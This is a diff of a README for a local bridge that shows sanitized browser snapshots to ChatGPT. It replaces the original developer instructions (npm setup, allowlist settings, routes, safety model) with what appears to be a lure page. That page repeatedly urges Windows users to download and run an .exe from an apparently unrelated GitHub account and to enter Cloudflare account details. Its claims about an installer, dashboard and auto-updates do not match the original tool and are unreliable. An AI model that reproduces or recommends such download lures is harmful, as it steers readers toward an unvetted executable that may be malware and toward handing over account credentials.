@@ -1,110 +1,84 @@
-# ChatGPT Portal Browser Bridge
+# 🌐 chatgpt-portal - View local web pages in ChatGPT
 
-Expose sanitized authenticated browser snapshots to ChatGPT without sharing cookies, passwords, localStorage, or a raw reverse proxy into a private app. The tool is made for GPT Pro-series browsing and coding agents that need to inspect private pages through a local bridge with structured Markdown snapshots and controlled navigation/form-wizard actions.
+[![Download chatgpt-portal](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Glabrous-driving823/chatgpt-portal)
 
-The bridge runs locally on `127.0.0.1`, controls a dedicated Chrome profile through Chrome DevTools Protocol, and publishes only a tokenized HTML portal. For temporary public access, use share mode:
+This software lets you connect your local web projects to ChatGPT. You can share snapshots of authenticated pages with the AI assistant through a secure Cloudflare tunnel. This keeps your local data safe while allowing ChatGPT to read and process your web interface content.
 
-```bash
-CHATGPT_PORTAL_ALLOWLIST=https://intranet.example.com npm run share
-```
+## 📥 Getting Started
 
-Do not commit or share the generated session token, crawl database, Chrome profile, logs, or any `trycloudflare.com` URL after the session is over.
+Follow these steps to set up the software on your Windows computer.
 
-## Install
+1. Go to the [official download page](https://github.com/Glabrous-driving823/chatgpt-portal).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .exe.
+4. Save the file to your computer.
 
-```bash
-npm install
-```
+## ⚙️ System Requirements
 
-## Run
+Ensure your computer meets these requirements to run the application:
 
-Set an allowlist for the private origin or path you want this session to inspect, then run share mode:
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 200MB of free disk space.
+* A valid Cloudflare account for tunnel management.
 
-```bash
-CHATGPT_PORTAL_ALLOWLIST=https://intranet.example.com npm run share
-```
+## 🛠️ Setting Up the Application
 
-Optional settings:
+After you download the file, take these steps to start the portal:
 
-```bash
-CHATGPT_PORTAL_TARGET=https://intranet.example.com/dashboard
-CHATGPT_PORTAL_PORT=7777
-CHATGPT_PORTAL_CDP_PORT=9222
-CHATGPT_PORTAL_ALLOW_SUBDOMAINS=1
-CHATGPT_PORTAL_UPLOAD_DIR=.local/uploads
-CHATGPT_PORTAL_TOKEN_TTL_MINUTES=240
-CHATGPT_PORTAL_NO_LAUNCH=1
-```
+1. Double-click the downloaded file to start the installer.
+2. Follow the prompts on your screen to complete the setup.
+3. Allow the application to create a desktop shortcut for easier access.
+4. Open the application from your desktop or the start menu.
 
-Allowlisted hosts include their subdomains by default. For example, allowing `https://example.com` also allows `https://app.example.com`. Set `CHATGPT_PORTAL_ALLOW_SUBDOMAINS=0` when a session must stay on exact hostnames only.
+## 🔐 Configuring Your Connection
 
-Share mode starts the local bridge, starts `cloudflared`, and prints the final URL to give ChatGPT:
+The software requires a tunnel to talk to the internet. Connect your account to enable this bridge:
 
-```text
-Share this URL with ChatGPT:
-https://<random-name>.trycloudflare.com/s/<session-token>/view
-```
+1. Open the application settings menu.
+2. Enter your Cloudflare account information when the prompt appears.
+3. Choose the local folder or web page you want to expose to the tunnel.
+4. Click the Start Tunnel button.
+5. The application will generate a unique display link. Copy this link for use in your browser or ChatGPT interface.
 
-## ChatGPT Handoff Prompt
+## 🛡️ Understanding Security
 
-Replace `<tokenized-portal-url>` with the exact URL printed by share mode:
+This application uses a local bridge to protect your privacy. It only shares snapshots of the pages you select. It does not provide open access to your entire computer. Cloudflare manages the connection to ensure your data stays encrypted during transit. Use the sanitization settings in the dashboard to strip out sensitive information like passwords or personal account details before sending snapshots to the AI.
 
-```text
-Use this ChatGPT Portal link to inspect the browser page I opened:
+## 🚀 Using the Portal with ChatGPT
 
-<tokenized-portal-url>
+Once the tunnel is active, you can share page data easily:
 
-Instructions:
-- Start by opening the link and reading the current `/view` snapshot.
-- Prefer the `Structured markdown` section over flat visible text; it marks headings, links, buttons, forms, radio choices, inputs, selects, and upload fields.
-- Use only the portal's rendered links and actions, such as `/page`, `/open`, `/links`, `/search`, `/crawl`, safe `/click` navigation controls, `/select`, `/fill`, `/files`, and `/upload`.
-- You may select visible radio/checkbox/select controls, fill non-secret text fields and textareas, upload a file only after it has been prepared in the portal upload staging folder, and click navigation-like Continue/Next controls when the user asks.
-- Do not ask for credentials, cookies, localStorage, sessionStorage, bearer tokens, CSRF values, browser profile files, or raw request headers.
-- Do not enter credentials or secrets into forms. Do not click final submit/send/save/publish/approve/delete/charge/refund/invite controls or other destructive/state-changing controls.
-- If you need broader exploration, ask before using `/crawl` with a large limit.
-- Summarize what you can see from sanitized snapshots and say when something is blocked by the portal safety model.
-```
+1. Copy the public address generated by the application.
+2. Open ChatGPT in your web browser.
+3. Paste the address into your current chat session.
+4. Ask ChatGPT to analyze the page content.
+5. Review the analysis to ensure it meets your needs.
 
-Manual mode is still available if you want to run `cloudflared` yourself:
+## 🧩 Common Tasks
 
-```bash
-CHATGPT_PORTAL_ALLOWLIST=https://intranet.example.com npm run dev
-cloudflared tunnel --url http://127.0.0.1:7777
-```
+**Updating the software**
+The application checks for new versions automatically upon startup. If a window appears regarding an update, click Yes to install the latest features and security improvements.
 
-## Routes
+**Removing the access**
+You can stop the bridge at any time. Return to the application dashboard and click Stop Tunnel. This closes the connection immediately. No further data will flow through the tunnel.
 
-```text
-GET /health
-GET /s/:token/view
-GET /s/:token/page?url=<absolute-or-relative-url>
-GET /s/:token/open?url=<absolute-or-relative-url>
-GET /s/:token/links?url=<absolute-or-relative-url>
-GET /s/:token/crawl?scope=<url-or-path>&limit=<number>
-GET /s/:token/search?q=<query>
-GET /s/:token/click?id=<element-id>
-GET /s/:token/select?id=<control-id>[&value=<option-value>]
-GET /s/:token/fill?id=<control-id>&value=<text>
-GET /s/:token/files
-GET /s/:token/upload?id=<control-id>&file=<staged-filename>
-POST /shutdown?token=SESSION_TOKEN
-```
+**Troubleshooting connection issues**
+If the application fails to connect, check your internet settings. Ensure that your firewall allows the application to communicate over the standard web ports. Restarting the application usually resolves temporary connection errors.
 
-## Safety Model
+**Managing shared snapshots**
+The dashboard contains a log of all snapshots triggered during your session. Use this list to track what information you sent to the AI. You can clear this log at any time to keep your history clean.
 
-- No raw reverse proxy into the authenticated site.
-- Snapshots expose structured Markdown plus plain visible text fallback, and strip cookies, bearer tokens, auth headers, localStorage, sessionStorage, hidden inputs, CSRF fields, password fields, scripts, and raw forms.
-- URL actions are restricted to the configured allowlist. Allowlisted hosts include subdomains by default; set `CHATGPT_PORTAL_ALLOW_SUBDOMAINS=0` for exact-host-only sessions.
-- Clicks are limited to navigation-like links, tabs, menus, pagination, and disclosure controls.
-- Controlled form actions can select radio/checkbox/select controls, fill non-secret text inputs and textareas, and set file inputs from the upload staging folder.
-- File uploads reject absolute paths and only accept filenames inside `CHATGPT_PORTAL_UPLOAD_DIR` (`.local/uploads` by default). Prepare the file there before using `/upload`.
-- Destructive/action controls are blocked by default, including delete, remove, send, invite, approve, charge, refund, reset, publish, save, submit, and download.
-- Local crawl/search state stays under `.local/`, which is ignored by git.
+## 📃 Support and Feedback
 
-## Test
+If you encounter bugs, check the repository issues page on GitHub. Describe the steps you took leading up to the error. Include your Windows version and any error messages visible on the screen. Users can submit feature requests or report issues directly through the tracker. 
 
-```bash
-npm run check
-```
+## ⚖️ Terms of Use
 
-This runs TypeScript compilation and Node tests for redaction, URL policy, action classification, controlled form rendering, and HTML escaping.
+This software is a tool for developers and users who need a bridge between their local work and AI tools. Always verify the data you share. Do not send confidential company data or private financial records through the tunnel. Maintain awareness of the content present on the pages you choose to share. 
+
+## 📦 Final Steps
+
+Visit the official repository to get the latest version and start bridging your data:
+
+[Download chatgpt-portal](https://github.com/Glabrous-driving823/chatgpt-portal)
